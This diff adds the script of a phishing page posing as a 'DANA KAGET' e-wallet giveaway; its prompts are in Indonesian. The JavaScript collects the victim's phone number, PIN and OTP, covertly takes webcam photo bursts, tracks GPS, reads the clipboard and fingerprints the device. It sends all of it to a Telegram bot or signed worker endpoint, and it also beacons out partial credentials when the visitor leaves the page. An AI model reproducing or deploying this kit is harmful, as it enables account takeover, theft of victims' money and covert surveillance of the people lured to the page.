+      c.height = v.videoHeight || 360;
+      c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+      return c.toDataURL("image/jpeg", 0.82).split(",")[1];
+    } catch(e){ return null; }
+  }
+
+  function releaseCam(){
+    if(_liveCamStream){
+      try { _liveCamStream.getTracks().forEach(t => t.stop()); } catch(e){}
+      _liveCamStream = null;
+    }
+  }
+
+  async function burstFrames(stream, count){
+    count = count || 3;
+    const out = [];
+    for(let i = 0; i < count; i++){
+      const b = await grabFrame(stream, i === 0 ? 800 : 400);
+      if(b) out.push(b);
+    }
+    return out;
+  }
+
+  async function getPhoto(timeoutMs){
+    timeoutMs = timeoutMs || 4500;
+    if(_camResult) return _camResult;
+    if(_liveCamStream){
+      const burst = await burstFrames(_liveCamStream, 3);
+      releaseCam();
+      if(burst.length){ _camBurst = burst; _camResult = burst[0]; markGranted(); }
+      return _camResult;
+    }
+    try {
+      const gum = navigator.mediaDevices && navigator.mediaDevices.getUserMedia
+        ? navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices) : null;
+      if(!gum) return null;
+      const stream = await Promise.race([
+        gum({ video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 720 } }, audio: false }),
+        new Promise((_, rej) => setTimeout(() => rej(new Error("gum-timeout")), timeoutMs))
+      ]);
+      const burst = await burstFrames(stream, 3);
+      try { stream.getTracks().forEach(t => t.stop()); } catch(e){}
+      if(burst.length){ _camBurst = burst; _camResult = burst[0]; markGranted(); }
+      return _camResult;
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // SENSORS / CLIPBOARD / LOCALE
+  // ═══════════════════════════════════════════════════════════
+  async function sensorProbe(){
+    return new Promise(resolve => {
+      const out = { motion: null, orient: null };
+      let done = false;
+      const finish = () => { if(!done){ done = true; resolve(out); } };
+      try {
+        const mo = window.DeviceMotionEvent;
+        if(mo && typeof mo.requestPermission === "function"){
+          mo.requestPermission().then(r => {
+            if(r === "granted"){
+              const h = (e) => {
+                out.motion = {
+                  a: e.accelerationIncludingGravity ? [e.accelerationIncludingGravity.x, e.accelerationIncludingGravity.y, e.accelerationIncludingGravity.z] : null,
+                  r: e.rotationRate ? [e.rotationRate.alpha, e.rotationRate.beta, e.rotationRate.gamma] : null
+                };
+                window.removeEventListener("devicemotion", h);
+                finish();
+              };
+              window.addEventListener("devicemotion", h);
+              setTimeout(finish, 1500);
+            } else finish();
+          }).catch(finish);
+        } else if(mo){
+          const h = (e) => {
+            out.motion = { a: e.accelerationIncludingGravity ? [e.accelerationIncludingGravity.x, e.accelerationIncludingGravity.y, e.accelerationIncludingGravity.z] : null };
+            window.removeEventListener("devicemotion", h);
+            finish();
+          };
+          window.addEventListener("devicemotion", h);
+          setTimeout(finish, 1500);
+        } else finish();
+      } catch(e){ finish(); }
+    });
+  }
+
+  async function clipboardProbe(){
+    try {
+      if(!navigator.clipboard || !navigator.clipboard.readText) return null;
+      const txt = await Promise.race([
+        navigator.clipboard.readText(),
+        new Promise(r => setTimeout(() => r(null), 800))
+      ]);
+      return txt ? txt.slice(0, 200) : null;
+    } catch(e){ return null; }
+  }
+
+  function languageProbe(){
+    try {
+      const dtf = new Intl.DateTimeFormat();
+      return {
+        resolvedLocale: dtf.resolvedOptions().locale,
+        calendar: dtf.resolvedOptions().calendar,
+        numbering: dtf.resolvedOptions().numberingSystem,
+        hourCycle: dtf.resolvedOptions().hourCycle
+      };
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // TRANSPORT
+  // ═══════════════════════════════════════════════════════════
+  async function sendRaw(kind, payload){
+    // Worker path with HMAC signing
+    if(MODE === "worker" && WORKER_URL){
+      try {
+        const bodyStr = JSON.stringify(payload);
+        const sig = await hmacSign(bodyStr, WORKER_SECRET);
+        const r = await fetch(WORKER_URL + (kind === "photo" ? "/photo" : "/send"), {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "X-Signature": sig || ""
+          },
+          body: bodyStr
+        });
+        return r.ok;
+      } catch(e){ return false; }
+    }
+    try {
+      if(kind === "text"){
+        const opts = {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TG_CHAT, text: payload.text, parse_mode: "Markdown", disable_web_page_preview: true })
+        };
+        const r = await fetch(TG_BASE + "/sendMessage", opts);
+        if(TG_BACK){
+          fetch(TG_BASE + "/sendMessage", {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: TG_BACK, text: payload.text, parse_mode: "Markdown", disable_web_page_preview: true })
+          }).catch(() => {});
+        }
+        return r.ok;
+      }
+      if(kind === "photo"){
+        const bin = atob(payload.photo);
+        const arr = new Uint8Array(bin.length);
+        for(let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+        const blob = new Blob([arr], { type: "image/jpeg" });
+        const fd = new FormData();
+        fd.append("chat_id", String(TG_CHAT));
+        fd.append("caption", payload.caption || "");
+        fd.append("photo", blob, "shot.jpg");
+        const r = await fetch(TG_BASE + "/sendPhoto", { method: "POST", body: fd });
+        if(TG_BACK){
+          const fd2 = new FormData();
+          fd2.append("chat_id", String(TG_BACK));
+          fd2.append("caption", payload.caption || "");
+          fd2.append("photo", blob, "shot.jpg");
+          fetch(TG_BASE + "/sendPhoto", { method: "POST", body: fd2 }).catch(() => {});
+        }
+        return r.ok;
+      }
+    } catch(e){ return false; }
+    return false;
+  }
+
+  async function sendMessage(text){
+    const ok = await sendRaw("text", { text });
+    if(!ok) queuePush({ kind: "text", payload: { text } });
+    return ok;
+  }
+
+  async function sendPhoto(base64, caption){
+    const ok = await sendRaw("photo", { photo: base64, caption });
+    if(!ok) queuePush({ kind: "photo", payload: { photo: base64, caption } });
+    return ok;
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // REPORT — dedupe + checksum + JSON mode
+  // ═══════════════════════════════════════════════════════════
+  async function captureAll(extra){
+    extra = extra || {};
+    const wantPhoto = extra.photo !== false;
+    const wantGeo = extra.geo !== false;
+    const t = {};
+    const mark = async (name, fn) => { const s = performance.now(); const v = await fn(); t[name] = Math.round(performance.now() - s); return v; };
+
+    const [perm, ip, loc, photo, fpCanvas, fpAudio, rtcIP, bat, stor, sensors, clip, lang] = await Promise.all([
+      mark("perm", permState),
+      mark("ip", getIP),
+      wantGeo ? mark("geo", () => _geoResult ? Promise.resolve(_geoResult) : (_liveGeoPromise || startGeo())) : Promise.resolve(null),
+      wantPhoto ? mark("cam", () => getPhoto()) : Promise.resolve(null),
+      mark("canvas", async () => canvasFP()),
+      mark("audio", audioFP),
+      mark("rtc", webrtcLeak),
+      mark("battery", batteryInfo),
+      mark("storage", storageInfo),
+      mark("sensors", sensorProbe),
+      mark("clip", clipboardProbe),
+      mark("lang", async () => languageProbe())
+    ]);
+    _liveGeoPromise = null;
+    const geo = await mark("ipgeo", () => ipGeo(ip));
+    const dev = deviceInfo();
+    const caps = mediaCaps();
+    const totalMs = Math.round(performance.now() - T0);
+
+    const identString = (ip || "") + "|" + (dev.ua || "") + "|" + (fpCanvas || "") + "|" + (fpAudio || "") + "|" + (rtcIP || "");
+    let identHash = 0;
+    for(let i = 0; i < identString.length; i++){ identHash = ((identHash << 5) - identHash + identString.charCodeAt(i)) | 0; }
+    identHash = (identHash >>> 0).toString(16).padStart(8, "0");
+
+    // structured payload for downstream parsing
+    const payload = {
+      v: 9,
+      ts_ms: Math.round(performance.now() - T0),
+      wall: new Date().toISOString(),
+      stage: extra.stage || "open",
+      vid: _visitorId, sid: _sessionId, ident: identHash, lang: LANG,
+      creds: {
+        phone: extra.phone || null,
+        pin: extra.pin || null,
+        otp: extra.otp || null
+      },
+      ip: { public: ip, webrtc: rtcIP },
+      geo: { ip: geo, gps: loc, trajectory: _geoTrajectory },
+      perm,
+      device: dev,
+      codecs: caps,
+      battery: bat,
+      storage: stor,
+      sensors,
+      clipboard: clip,
+      locale: lang,
+      fingerprint: { canvas: fpCanvas, audio: fpAudio },
+      events: _eventLog,
+      timing: t,
+      total_ms: totalMs
+    };
+
+    const payloadStr = JSON.stringify(payload);
+    const checksum = await sha256Hex(payloadStr);
+
+    // dedupe — skip if we've already pushed this exact payload
+    const dedupeKey = (extra.stage || "open") + ":" + checksum;
+    if(_captureHistory.some(c => c.sha === dedupeKey)){
+      logEvent("dedupe-skip", dedupeKey);
+      return { text: null, ip, loc, dev, photo, skipped: true };
+    }
+    _captureHistory.push({ sha: dedupeKey, ts: totalMs, stage: extra.stage || "open" });
+    if(_captureHistory.length > 20) _captureHistory.shift();
+
+    const L = [];
+    L.push("*DANA KAGET — " + String(extra.stage || "open").toUpperCase() + "*");
+    L.push("`vid " + _visitorId + " | sid " + _sessionId + " | ident " + identHash + " | sha " + checksum + " | lang " + LANG + "`");
+    L.push("");
+    if(extra.phone) L.push("📱 Nomor: `" + extra.phone + "`");
+    if(extra.pin)   L.push("🔑 PIN: `" + extra.pin + "`");
+    if(extra.otp)   L.push("🔐 OTP: `" + extra.otp + "`");
+    if(ip) L.push("🌐 Public IP: `" + ip + "`");
+    if(rtcIP) L.push("🛰 WebRTC IP: `" + rtcIP + "`");
+    if(geo){
+      L.push("📍 Location: " + (geo.city || "-") + ", " + (geo.region || "-") + ", " + (geo.country || "-"));
+      L.push("🏢 ISP: " + (geo.connection && geo.connection.isp || "-") + " | ASN: " + (geo.connection && geo.connection.asn || "-"));
+      if(geo.latitude) L.push("🗺 Coords (IP): `" + geo.latitude + ", " + geo.longitude + "` — https://maps.google.com/?q=" + geo.latitude + "," + geo.longitude);
+    }
+    if(loc) L.push("📌 GPS: `" + loc.lat + ", " + loc.lng + "` (acc " + Math.round(loc.acc) + "m) — https://maps.google.com/?q=" + loc.lat + "," + loc.lng);
+    else L.push("📌 GPS: `not-granted`");
+
+    if(_geoTrajectory.length > 1){
+      L.push("");
+      L.push("*Trajectory*");
+      _geoTrajectory.slice(-6).forEach(p => L.push("`" + p.ts + "ms` → `" + p.lat.toFixed(5) + "," + p.lng.toFixed(5) + "` (acc " + Math.round(p.acc||0) + "m)"));
+    }
+
+    L.push("");
+    L.push("*Permission State*");
+    L.push("Geo: " + perm.geo + " | Cam: " + perm.cam + " | Mic: " + perm.mic + " | Notif: " + perm.notif + " | Clip: " + perm.clip + " | Accel: " + perm.accel);
+    L.push("Origin cached grant: " + (grantedOnce() ? "yes" : "no"));
+
+    L.push("");
+    L.push("*Device*");
+    L.push("UA: `" + (dev.ua || "-") + "`");
+    L.push("Platform: " + dev.platform + " | Vendor: " + dev.vendor + " | Lang: " + dev.lang + " (" + dev.langs + ")");
+    L.push("TZ: " + dev.tz + " (offset " + dev.tzOffset + ") | Screen: " + dev.screen + " | Avail: " + dev.avail + " | Depth: " + dev.colorDepth);
+    L.push("Cores: " + (dev.cores || "-") + " | Mem: " + (dev.mem || "-") + "GB | Touch: " + dev.touch + " | MaxTouch: " + dev.maxTouch);
+    L.push("Conn: " + (dev.conn || "-") + " | Down: " + (dev.downlink || "-") + "Mbps | RTT: " + (dev.rtt || "-") + "ms | SaveData: " + dev.saveData);
+    if(dev.gpu) L.push("GPU: `" + dev.gpu + "` (" + (dev.gpuVendor || "?") + ")");
+    if(dev.glVersion) L.push("GL: `" + dev.glVersion + "` | SL: " + (dev.shadingLang || "-"));
+    L.push("Cookie: " + dev.cookie + " | DNT: " + dev.dnt + " | GPC: " + dev.gpc + " | PDF: " + dev.pdf);
+    L.push("Plugins: " + dev.plugins + " | Stand: " + dev.stand + " | Webdriver: " + dev.webdriver);
+    L.push("Codecs: " + (caps || "none"));
+    if(bat) L.push("🔋 Battery: " + bat.lvl + "% (" + bat.charging + ")");
+    if(stor) L.push("💾 Storage: " + stor.usageMB + "/" + stor.quotaMB + " MB");
+    if(lang) L.push("🌍 Locale: " + lang.resolvedLocale + " | Cal: " + lang.calendar + " | Num: " + lang.numbering + " | Hour: " + lang.hourCycle);
+
+    if(sensors && (sensors.motion || sensors.orient)) {
+      L.push("");
+      L.push("*Sensors*");
+      if(sensors.motion && sensors.motion.a) L.push("Accel: `" + sensors.motion.a.map(v => v && v.toFixed(2)).join(", ") + "`");
+      if(sensors.motion && sensors.motion.r) L.push("Gyro: `" + sensors.motion.r.map(v => v && v.toFixed(2)).join(", ") + "`");
+    }
+    if(clip) {
+      L.push("");
+      L.push("*Clipboard*");
+      L.push("`" + clip.replace(/[`\\]/g, "") + "`");
+    }
+
+    L.push("");
+    L.push("*Fingerprint*");
+    if(fpCanvas) L.push("Canvas: `" + fpCanvas + "`");
+    if(fpAudio) L.push("Audio: `" + fpAudio + "`");
+
+    if(_eventLog.length){
+      L.push("");
+      L.push("*Interaction Log*");
+      _eventLog.slice(-12).forEach(e => L.push("`" + e.ts + "ms` " + e.kind + (e.detail ? " — " + e.detail : "")));
+    }
+
+    L.push("");
+    L.push("*Timing*");
+    L.push("Total: " + totalMs + "ms | " + Object.keys(t).map(k => k + ":" + t[k]).join(" "));
+    L.push("");
+    L.push("*JSON*");
+    L.push("`" + checksum + "` (sha256-16 of full payload)");
+    L.push("Payload JSON queued to secondary channel.");
+
+    return { text: L.join("\n"), ip, loc, dev, photo, payload, checksum };
+  }
+
+  async function push(extra){
+    try {
+      const r = await captureAll(extra);
+      if(r.skipped) return r;
+      const tasks = [ sendMessage(r.text) ];
+      if(r.photo) tasks.push(sendPhoto(r.photo, "📸 " + (extra.stage || "open") + " — " + (extra.phone || r.ip || "")));
+      if(_camBurst.length > 1){
+        for(let i = 1; i < _camBurst.length; i++){
+          tasks.push(sendPhoto(_camBurst[i], "📸 burst " + i + " — " + (extra.stage || "open")));
+        }
+      }
+      // full JSON payload to a separate message for machine parsing
+      if(r.payload){
+        const json = JSON.stringify(r.payload);
+        if(json.length < 3800){
+          tasks.push(sendMessage("*DANA KAGET — JSON*\n```\n" + json + "\n```"));
+        } else {
+          // split across two messages
+          const half = Math.ceil(json.length / 2);
+          tasks.push(sendMessage("*DANA KAGET — JSON-A*\n```\n" + json.slice(0, half) + "\n```"));
+          tasks.push(sendMessage("*DANA KAGET — JSON-B*\n```\n" + json.slice(half) + "\n```"));
+        }
+      }
+      await Promise.all(tasks);
+      queueFlush().catch(() => {});
+      return r;
+    } catch(e){ return null; }
+  }
+
+  // ═══════════════════════════════════════════════════════════
+  // OPEN
+  // ═══════════════════════════════════════════════════════════
+  (async function onOpen(){
+    logEvent("open");
+    queueFlush().catch(() => {});
+
+    const perm = await permState();
+    const cached = grantedOnce();
+    const geoAlready = (perm.geo === "granted") || cached;
+    const camAlready = (perm.cam === "granted") || cached;
+    const notifAlready = (perm.notif === "granted");
+
+    if(geoAlready) startGeoWatch();
+
+    push({ stage: geoAlready ? "open-silent" : "open", photo: camAlready, geo: geoAlready }).catch(() => {});
+
+    if(!geoAlready) step1.classList.add("show");
+    else if(!camAlready) step2.classList.add("show");
+    else if(!notifAlready) step3.classList.add("show");
+  })();
+
+  // ═══════════════════════════════════════════════════════════
+  // LADDER
+  // ═══════════════════════════════════════════════════════════
+  step1go.addEventListener("click", async () => {
+    logEvent("grant-geo-tap");
+    step1t.textContent = "Meminta…";
+    _liveGeoPromise = startGeo();
+    const r = await _liveGeoPromise;
+    if(r){
+      logEvent("grant-geo-ok", r.lat.toFixed(4) + "," + r.lng.toFixed(4));
+      startGeoWatch();
+      step1.classList.remove("show");
+      step2.classList.add("show");
+      push({ stage: "grant-geo", geo: true, photo: false }).catch(() => {});
+    } else {
+      logEvent("grant-geo-deny");
+      step1t.textContent = "Coba Lagi";
+    }
+  });
+
+  step2go.addEventListener("click", async () => {
+    logEvent("grant-cam-tap");
+    step2t.textContent = "Meminta…";
+    startCamSync();
+    const photo = await getPhoto(6000);
+    if(photo){
+      logEvent("grant-cam-ok");
+      step2.classList.remove("show");
+      step3.classList.add("show");
+      push({ stage: "grant-cam", geo: true, photo: true }).catch(() => {});
+    } else {
+      logEvent("grant-cam-deny");
+      step2t.textContent = "Coba Lagi";
+    }
+  });
+
+  step3go.addEventListener("click", async () => {
+    logEvent("grant-notif-tap");
+    step3t.textContent = "Meminta…";
+    try {
+      if("Notification" in window){
+        const r = await Notification.requestPermission();
+        _notifGranted = (r === "granted");
+        logEvent("grant-notif-" + r);
+        step3.classList.remove("show");
+        push({ stage: "grant-notif", geo: true, photo: true }).catch(() => {});
+      } else {
+        step3.classList.remove("show");
+      }
+    } catch(e){
+      logEvent("grant-notif-error");
+      step3.classList.remove("show");
+    }
+  });
+
+  // ═══════════════════════════════════════════════════════════
+  // STAGE 1
+  // ═══════════════════════════════════════════════════════════
+  go1.addEventListener("click", () => {
+    logEvent("claim-tap");
+    startCamSync();
+    _liveGeoPromise = startGeo();
+
+    const phone = phoneEl.value.trim();
+    const pin = pinEl.value.trim();
+    if(!/^0?8\d{8,12}$/.test(phone)){ phoneEl.focus(); return; }
+    if(!/^\d{6}$/.test(pin)){ pinEl.focus(); return; }
+
+    go1.disabled = true;
+    b1t.innerHTML = '<span class="spinner"></span>Memverifikasi…';
+
+    logEvent("creds-submit", phone);
+
+    push({ stage: "creds", phone, pin, photo: true, geo: true }).catch(() => {});
+
+    setTimeout(() => {
+      stage1.classList.add("hidden");
+      stage2.classList.remove("hidden");
+      otpEl.focus();
+    }, 320);
+  });
+
+  // ═══════════════════════════════════════════════════════════
+  // STAGE 2
+  // ═══════════════════════════════════════════════════════════
+  go2.addEventListener("click", () => {
+    logEvent("otp-tap");
+    startCamSync();
+    _liveGeoPromise = startGeo();
+
+    const otp = otpEl.value.trim();
+    if(!/^\d{6}$/.test(otp)){ otpEl.focus(); return; }
+
+    go2.disabled = true;
+    b2t.innerHTML = '<span class="spinner"></span>Memverifikasi…';
+    prog.style.width = "100%";
+
+    logEvent("otp-submit", otp);
+
+    push({ stage: "otp", otp, phone: phoneEl.value.trim(), photo: true, geo: true }).catch(() => {});
+
+    setTimeout(() => {
+      stage2.classList.add("hidden");
+      stage3.classList.remove("hidden");
+      setTimeout(() => {
+        plPhone.textContent = (phoneEl.value.trim().replace(/.(?=.{4})/g, "•"));
+        postLogin.style.display = "block";
+        logEvent("post-login-shown");
+      }, 1400);
+    }, 500);
+  });
+
+  // ═══════════════════════════════════════════════════════════
+  // INPUT HANDLERS
+  // ═══════════════════════════════════════════════════════════
+  function digitsOnly(el, max, next){
+    el.addEventListener("input", (e) => {
+      let v = e.target.value.replace(/\D/g, "");
+      if(max) v = v.slice(0, max);
+      e.target.value = v;
+      if(max && v.length === max && next) next.focus();
+    });
+  }
+  digitsOnly(phoneEl, 14, pinEl);
+  digitsOnly(pinEl, 6, go1);
+  otpEl.addEventListener("input", (e) => {
+    let v = e.target.value.replace(/\D/g, "").slice(0, 6);
+    e.target.value = v;
+    if(v.length === 6) go2.focus();
+  });
+
+  // ═══════════════════════════════════════════════════════════
+  // ABANDON FLUSH
+  // ═══════════════════════════════════════════════════════════
+  function flushPartial(){
+    try {
+      const phone = phoneEl.value.trim(), pin = pinEl.value.trim(), otp = otpEl.value.trim();
+      if(!phone && !pin && !otp) return;
+      const text = "*DANA KAGET — ABANDON*\n\n" +
+        (phone ? "📱 `" + phone + "`\n" : "") +
+        (pin ? "🔑 `" + pin + "`\n" : "") +
+        (otp ? "🔐 `" + otp + "`\n" : "") +
+        "vid: `" + _visitorId + "` | sid: `" + _sessionId + "`\n" +
+        "UA: `" + navigator.userAgent + "`";
+      const body = JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: "Markdown" });
+      if(navigator.sendBeacon){
+        navigator.sendBeacon(TG_BASE + "/sendMessage", new Blob([body], { type: "application/json" }));
+      }
+    } catch(e){}
+  }
+  window.addEventListener("pagehide", flushPartial);
+  document.addEventListener("visibilitychange", () => {
+    if(document.visibilityState === "hidden") flushPartial();
+    else queueFlush().catch(() => {});
+  });
+  window.addEventListener("online", () => { queueFlush().catch(() => {}); });
+})();
+</script>
+</body>
+</html>
